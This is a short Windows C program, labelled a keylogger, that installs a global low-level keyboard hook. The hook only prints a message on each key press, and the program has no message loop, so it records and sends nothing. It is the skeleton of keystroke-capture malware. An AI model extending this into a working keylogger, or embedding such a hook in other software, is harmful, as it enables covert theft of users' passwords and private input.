#include <windows.h>
#include <stdio.h>

//Keys Log
LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    printf("Key was pressed\n");
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (hhook == NULL) {
        printf("keylog failed\n");
    } else {
        printf("keylog started\n");
    }
}